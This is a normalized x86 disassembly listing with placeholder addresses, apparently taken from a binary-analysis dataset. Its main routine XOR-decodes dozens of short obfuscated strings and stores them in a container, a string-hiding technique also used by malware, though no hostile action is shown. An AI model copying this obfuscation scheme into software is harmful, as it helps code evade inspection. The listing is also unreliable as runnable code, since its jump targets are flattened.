mov eax [ edi ]
push eax
push esi
push r--data
call sub_100386a0
mov edx [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx * 4 + rw-data ]
push edx
push esi
push edi
push eax
call ecx
xor ecx ecx
add esp 0x20
cmp [ edi + 0x4 ] ecx
mov [ edi + 0x4 ] 0x0
sete cl
cmp eax 0x1
jne r-xdata
push ebx
call sub_1000ac10
add esp 0x4
sub_100618b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
push 0x16
pop eax
pop ebp
retn
sub_100618f0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0xc ] eax
call sub_1007f580
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0xc ] 0x0
sub_1006192c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
push 0x16
pop eax
pop ebp
retn
sub_10061960
push ebp
mov ebp esp
push 0xffffffff
push sub_10087486
mov eax [ fs : 0x0 ]
push eax
sub esp 0x19c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ r--data ]
mov edi ecx
xor ebx ebx
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ esi + eax ]
xor dl cl
xor dl 0x49
inc cl
mov [ ebp + eax - 0xb8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb8 ]
mov [ ebp - 0xb2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea edx [ ebp - 0x154 ]
lea ecx [ edi + 0xf0 ]
push edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x174 ] ecx
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax [ ebp - 0x154 ]
push eax
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xf0
inc cl
mov [ ebp + eax - 0x70 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd4
inc cl
mov [ ebp + eax - 0xc8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov [ ebp - 0xc2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x2
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x33
inc cl
mov [ ebp + eax - 0x80 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x3
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x78
inc cl
mov [ ebp + eax - 0x48 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xe3
inc cl
mov [ ebp + eax - 0x60 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x5
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x33
inc cl
mov [ ebp + eax - 0xf0 ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
lea eax [ ebp - 0xf0 ]
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x6
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xc2
inc cl
mov [ ebp + eax - 0x78 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x7
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xf5
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x8
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x3a
inc cl
mov [ ebp + eax - 0xb0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xaa ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x9
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xc7
inc cl
mov [ ebp + eax - 0x50 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xa
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xcc
inc cl
mov [ ebp + eax - 0x58 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xb
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd4
inc cl
mov [ ebp + eax - 0xc0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc0 ]
mov [ ebp - 0xba ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xc
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x9d
inc cl
mov [ ebp + eax - 0x17c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x17c ]
mov [ ebp - 0x17a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xd
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xfb
inc cl
mov [ ebp + eax - 0x18 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xe
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x3f
inc cl
mov [ ebp + eax - 0xd0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov esi 0xf
lea eax [ ebp - 0xd0 ]
mov [ ebp - 0xca ] bl
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] esi
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xc4
inc cl
mov [ ebp + eax - 0x20 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov esi 0x10
mov [ ebp - 0x4 ] esi
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] esi
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xc4
inc cl
mov [ ebp + eax - 0x190 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x190 ]
mov [ ebp - 0x18e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x190 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x11
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xed
inc cl
mov [ ebp + eax - 0x180 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x17e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x180 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x12
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x3c
inc cl
mov [ ebp + eax - 0x188 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x188 ]
mov [ ebp - 0x186 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x188 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x13
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd2
inc cl
mov [ ebp + eax - 0x184 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x184 ]
mov [ ebp - 0x182 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x184 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x14
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xa1
inc cl
mov [ ebp + eax - 0x30 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x15
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x96
inc cl
mov [ ebp + eax - 0x40 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x16
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x4d
inc cl
mov [ ebp + eax - 0x194 ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0x194 ]
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x194 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x17
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xda
inc cl
mov [ ebp + eax - 0x18c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x18c ]
mov [ ebp - 0x18a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x18
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xcc
inc cl
mov [ ebp + eax - 0x68 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x19
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x80
inc cl
mov [ ebp + eax - 0xa8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0xa2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1a
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xf1
inc cl
mov [ ebp + eax - 0x38 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1b
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x130 ]
mov eax 0x5e
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x130 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
mov esi [ ebp - 0x174 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1c
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xd8 ]
mov eax 0x48
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
